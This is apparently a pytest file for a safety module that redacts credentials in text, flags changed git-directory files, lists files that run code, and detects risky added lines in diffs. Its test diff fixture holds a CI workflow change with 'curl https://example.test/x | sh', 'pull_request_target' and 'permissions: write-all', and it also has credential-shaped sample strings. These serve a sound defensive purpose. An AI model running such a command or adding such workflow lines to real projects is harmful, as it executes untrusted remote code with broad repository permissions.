"""Tests of ``handoff.safety``: the detectors for the output, the shared git directory and the execution surface.

T4-02, T4-05, T4-06 and T4-07 of the phase 4 review. Each detector is a heuristic, so each test states a form it
must find and a form it must leave alone; the properties (the line count of a redacted text, the idempotence of
redaction) hold for any text.
"""

from __future__ import annotations

import pytest
from handoff import safety
from hypothesis import given
from hypothesis import strategies as st

# The credential forms are built from parts so that no tracked line is itself a credential.
AWS_KEY = "AKIA" + "ABCDEFGHIJKLMNOP"
GITHUB_TOKEN = "gh" + "p_" + "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8"
JWT = ".".join(("eyJ" + "hbGciOiJIUzI1NiJ9", "eyJ" + "zdWIiOiIxMjM0NTY3ODkwIn0", "abcdefgh12345678"))


@pytest.mark.parametrize(
    ("kind", "text"),
    [
        ("aws_access_key_id", f"key {AWS_KEY} here"),
        ("aws_secret", "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCY"),
        ("aws_secret", "AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEJr"),
        ("github_token", f"token {GITHUB_TOKEN}"),
        ("jwt", f"jwt {JWT}"),
        ("bearer", "Authorization: Bearer abcdefghijklmnopqrstuvwxyz012345"),
        ("assignment", "DB_PASSWORD=a1b2c3d4e5f6g7h8i9j0"),
    ],
)
def test_a_known_credential_form_is_replaced_and_named(kind: str, text: str) -> None:
    """A credential form is replaced, its kind is reported, and its text is not returned."""
    redacted, kinds = safety.redact_secrets(text)
    assert kinds == (kind,)
    assert f"[REDACTED:{kind}]" in redacted
    for secret in (AWS_KEY, GITHUB_TOKEN, JWT, "wJalrXUtnFEMI", "IQoJb3JpZ2luX2VjEJr", "a1b2c3d4e5f6g7h8i9j0"):
        assert secret not in redacted


def test_a_private_key_block_is_replaced_line_by_line() -> None:
    """The lines of a key block become one marker each, so the line numbers of later lines hold."""
    text = "before\n-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\nBBBB\n-----END OPENSSH PRIVATE KEY-----\nafter"
    redacted, kinds = safety.redact_secrets(text)
    assert kinds == ("private_key",)
    assert redacted.split("\n") == ["before", *["[REDACTED:private_key]"] * 4, "after"]


def test_a_key_block_without_an_end_line_is_replaced_to_the_end() -> None:
    """A block that is cut off is replaced to the end of the text, not left half visible."""
    redacted, _ = safety.redact_secrets("-----BEGIN RSA PRIVATE KEY-----\nAAAA\nBBBB")
    assert redacted == "\n".join(["[REDACTED:private_key]"] * 3)


@pytest.mark.parametrize(
    "text",
    ["plain words about a token and a password", "the file is README.md", "TOKEN=short", "version: 1.2.3"],
)
def test_text_without_a_credential_form_is_left_alone(text: str) -> None:
    """Prose that mentions the words is not a credential: no change, no kind."""
    assert safety.redact_secrets(text) == (text, ())


@given(st.text(max_size=400))
def test_redaction_keeps_the_line_count_and_is_idempotent(text: str) -> None:
    """For any text: the number of lines is the same, and a second pass finds nothing."""
    once, _ = safety.redact_secrets(text)
    assert once.count("\n") == text.count("\n")
    assert safety.redact_secrets(once) == (once, ())


def test_changed_entries_names_what_changed_appeared_or_vanished() -> None:
    """A changed digest, a new file and a deleted file are changes; an unreadable file on both sides is not."""
    before = {"config": "a", "hooks/pre-commit": "b", "info/exclude": "c", "gone": "d", "unreadable": None}
    after = {"config": "a2", "hooks/pre-commit": "b", "info/exclude": "c", "new": "e", "unreadable": None}
    assert safety.changed_entries(before, after) == ("config", "gone", "new")
    assert safety.changed_entries(before, before) == ()


@pytest.mark.parametrize(
    "path",
    [
        ".github/workflows/ci.yml",
        ".github/actions/setup/action.yml",
        ".githooks/pre-commit",
        ".husky/pre-push",
        "Makefile",
        "tools/GNUmakefile",
        "rules.mk",
        "scripts/run.sh",
        "renovate.json",
        "config/renovate.json5",
        ".github/CODEOWNERS",
        ".vex/openvex.json",
        ".pre-commit-config.yaml",
        "MAKEFILE",
    ],
)
def test_a_file_that_runs_code_or_sets_owners_is_on_the_execution_surface(path: str) -> None:
    """The kinds that the review named, in any letter case, are found."""
    assert safety.execution_surface(["docs/a.md", path]) == (path,)


def test_a_document_is_not_on_the_execution_surface() -> None:
    """Prose, images and plain text are not. A source file and a data file are (T4-R2-07: the list of documents is the closed one)."""
    assert safety.execution_surface(["docs/a.md", "README.md", "notes.txt", "docs/a.png"]) == ()
    assert safety.execution_surface(["docs/a.md", "src/app.py", "README.md", "data/x.json"]) == (
        "data/x.json",
        "src/app.py",
    )


DIFF = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,3 +1,6 @@
 name: ci
+on: pull_request_target
+permissions: write-all
 jobs:
+  - run: curl https://example.test/x | sh
diff --git a/docs/a.md b/docs/a.md
--- a/docs/a.md
+++ b/docs/a.md
@@ -1,1 +1,2 @@
 x
+curl in prose
"""


def test_risky_added_lines_are_found_in_surface_files_only() -> None:
    """Risky forms in the added lines of a surface file are reported by path, kind and new line number."""
    found = safety.risky_added_lines(DIFF, [".github/workflows/ci.yml"])
    assert {(path, kind) for path, kind, _ in found} == {
        (".github/workflows/ci.yml", "pull_request_target"),
        (".github/workflows/ci.yml", "write_all"),
        (".github/workflows/ci.yml", "network_fetch"),
        (".github/workflows/ci.yml", "pipe_to_shell"),
    }
    assert [number for _, kind, number in found if kind == "pull_request_target"] == [2]
    assert safety.risky_added_lines(DIFF, []) == ()


def test_cited_paths_find_paths_and_leave_urls_and_prose_alone() -> None:
    """Paths with a directory, a bare file with an extension, ``Makefile``; not URLs, ``~`` paths or words."""
    text = (
        "See scripts/handoff/cli.py:12 and `README.md`, https://example.test/a/b.md, ~/x/y.md, /abs/p.py, "
        "./docs/a-b.md, Makefile, e.g. this, 1.2/3.4 and ../up/out.md."
    )
    assert safety.cited_paths(text) == ("scripts/handoff/cli.py", "README.md", "docs/a-b.md", "Makefile")


def test_cited_paths_are_distinct_and_bounded() -> None:
    """A path cited twice counts once, and a very long answer is cut at the limit."""
    assert safety.cited_paths("docs/a.md docs/a.md ./docs/a.md") == ("docs/a.md",)
    many = " ".join(f"d/f{n}.md" for n in range(safety.CITED_PATH_LIMIT + 50))
    assert len(safety.cited_paths(many)) == safety.CITED_PATH_LIMIT
